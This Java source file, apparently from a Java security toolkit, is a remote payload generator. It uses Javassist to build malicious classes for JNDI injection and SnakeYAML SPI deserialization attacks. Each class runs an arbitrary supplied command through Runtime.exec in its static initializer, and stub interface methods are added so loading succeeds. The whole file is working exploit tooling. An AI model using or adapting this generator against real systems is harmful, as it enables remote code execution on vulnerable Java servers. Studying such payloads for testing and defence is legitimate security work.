package com.xyuxu.javasec.core.generator;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.bytecode.ClassFile;

public class RemotePayloadGenerator {

    // 1. JNDI
    public static byte[] createJNDIFactoryBytes(String className, String command) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.makeClass(className);

        // JNDI 必须实现 ObjectFactory
        cc.addInterface(pool.get("javax.naming.spi.ObjectFactory"));

        // 静态代码块 RCE
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" + command.replaceAll("\"", "\\\\\"") + "\");";
        cc.makeClassInitializer().insertAfter(cmd);

        // 实现 getObjectInstance 防止报错
        CtMethod method = CtMethod.make(
                "public Object getObjectInstance(Object obj, javax.naming.Name name, javax.naming.Context nameCtx, java.util.Hashtable environment) throws Exception { return null; }",
                cc
        );
        cc.addMethod(method);

        cc.getClassFile().setMajorVersion(ClassFile.JAVA_8);
        byte[] bytes = cc.toBytecode();
        cc.detach();
        return bytes;
    }

    // 2. SnakeYAML SPI
    public static byte[] createSPIFactoryBytes(String className, String command) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.makeClass(className);

        // SPI 必须实现 ScriptEngineFactory
        cc.addInterface(pool.get("javax.script.ScriptEngineFactory"));

        // 静态代码块 RCE
        String staticCode = String.format("try { java.lang.Runtime.getRuntime().exec(\"%s\"); } catch (Exception e) {}", command.replaceAll("\"", "\\\\\""));
        cc.makeClassInitializer().insertBefore(staticCode);

        // 填充 ScriptEngineFactory 的空方法
        implementEmptyMethods(pool, cc, "javax.script.ScriptEngineFactory");

        cc.getClassFile().setMajorVersion(ClassFile.JAVA_8);
        byte[] bytes = cc.toBytecode();
        cc.detach();
        return bytes;
    }

    // 辅助方法：为空实现填充方法
    private static void implementEmptyMethods(ClassPool pool, CtClass cc, String interfaceName) throws Exception {
        CtClass iface = pool.get(interfaceName);
        CtMethod[] methods = iface.getDeclaredMethods();
        for (CtMethod m : methods) {
            CtMethod newMethod = new CtMethod(m.getReturnType(), m.getName(), m.getParameterTypes(), cc);
            if (m.getReturnType() == CtClass.voidType) {
                newMethod.setBody("{}");
            } else if (m.getReturnType() == pool.get("java.lang.String")) {
                newMethod.setBody("return \"test\";");
            } else {
                newMethod.setBody("return null;");
            }
            cc.addMethod(newMethod);
        }
    }
}